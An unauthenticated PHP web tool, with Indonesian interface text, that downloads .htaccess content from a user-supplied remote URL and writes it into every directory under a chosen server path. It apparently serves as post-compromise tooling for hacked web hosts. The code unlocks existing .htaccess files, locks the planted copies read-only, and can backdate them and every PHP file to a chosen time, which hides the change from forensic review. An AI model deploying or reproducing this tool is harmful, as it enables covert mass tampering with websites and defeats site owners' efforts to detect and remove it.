<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$success = [];
$error = [];

// ===================================================================
// SEMUA FUNGSI DIDEFINISIKAN DI SINI (GLOBAL SCOPE)
// ===================================================================

function fetchFileFromUrl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
}

function setFolders0755($dir, &$success, &$error) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            if (@chmod($path, 0755)) {
                $success[] = "✅ Folder chmod 0755: $path";
            } else {
                $error[] = "❌ Gagal chmod folder: $path";
            }
            setFolders0755($path, $success, $error);
        }
    }
}

function setFiles0644($dir, &$success, &$error) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            setFiles0644($path, $success, $error);
        } elseif (is_file($path)) {
            if (@chmod($path, 0644)) {
                $success[] = "✅ File chmod 0644: $path";
            } else {
                $error[] = "❌ Gagal chmod file: $path";
            }
        }
    }
}

function unlockHtaccessFiles($dir, &$success, &$error) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            unlockHtaccessFiles($path, $success, $error);
        } elseif ($item === '.htaccess') {
            if (@chmod($path, 0644)) {
                $success[] = "✅ Unlock .htaccess: $path";
            } else {
                $error[] = "❌ Gagal unlock .htaccess: $path";
            }
        }
    }
}

function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;

        if (is_dir($path)) {
            $htaccessPath = $path . '/.htaccess';
            if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
                @chmod($htaccessPath, 0644);
            }
            
            if (@file_put_contents($htaccessPath, $content) === false) {
                $error[] = "❌ Gagal deploy ke: $htaccessPath";
            } else {
                $success[] = "✅ Deployed .htaccess: $htaccessPath";
                if (@chmod($htaccessPath, 0444)) {
                    $success[] = "🔒 .htaccess dikunci (0444): $htaccessPath";
                } else {
                    $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
                }
                if ($timestamp && @touch($htaccessPath, $timestamp)) {
                    $success[] = "⏱️ Timestamp set untuk $htaccessPath";
                } elseif ($timestamp) {
                    $error[] = "❌ Gagal set timestamp: $htaccessPath";
                }
            }
            deployHtaccess($path, $content, $success, $error, $timestamp);
        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
            if (@touch($path, $timestamp)) {
                $success[] = "⏱️ Timestamp set untuk PHP: $path";
            } else {
                $error[] = "❌ Gagal set timestamp untuk PHP: $path";
            }
        }
    }
}

// ===================================================================
// LOGIKA UTAMA HANYA BERJALAN SAAT REQUEST ADALAH POST
// ===================================================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetPath = rtrim($_POST['target_path'], '/');
    $url = $_POST['htaccess_url'];
    $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;

    if (!is_dir($targetPath)) {
        $error[] = "❌ Target path not found: $targetPath";
    } else {
        $htaccessContent = fetchFileFromUrl($url);
        if (!$htaccessContent) {
            $error[] = "❌ Gagal ambil isi .htaccess dari URL.";
        } else {
            // FUNGSI DIPANGGIL DI SINI, SETELAH SEMUA VALIDASI LOLOS
            $success[] = "--- 🔧 LANGKAH AWAL: Set Permission Folder & File ---";
            setFolders0755($targetPath, $success, $error);
            setFiles0644($targetPath, $success, $error);
            $success[] = "--- 🔓 UNLOCK .htaccess jika ada ---";
            unlockHtaccessFiles($targetPath, $success, $error);
            $success[] = "--- 🚀 MASS DEPLOY .htaccess ---";
            deployHtaccess($targetPath, $htaccessContent, $success, $error, $timestamp);
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass .htaccess Deployment</title>
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; }
        button { background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; }
        .log { background: #222; padding: 10px; margin-top: 20px; border-radius: 5px; }
        .success { color: #0f0; }
        .error { color: #f33; }
    </style>
</head>
<body>
    <h2>🚀 Mass .htaccess Deployment</h2>
    <form method="POST">
        <label>🎯 Target Path:</label>
        <input type="text" name="target_path" placeholder="/var/www/html" required>

        <label>🌐 URL .htaccess (GitHub raw, dll):</label>
        <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>

        <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
        <input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">

        <button type="submit">🚀 Deploy Sekarang</button>
    </form>

    <?php if (!empty($success)): ?>
        <div class="log">
            <h3>✅ Success Log:</h3>
            <?php foreach ($success as $line): ?>
                <div class="success">✔ <?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>

    <?php if (!empty($error)): ?>
        <div class="log">
            <h3>❌ Error Log:</h3>
            <?php foreach ($error as $line): ?>
                <div class="error">✖ <?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>
</body>
</html>
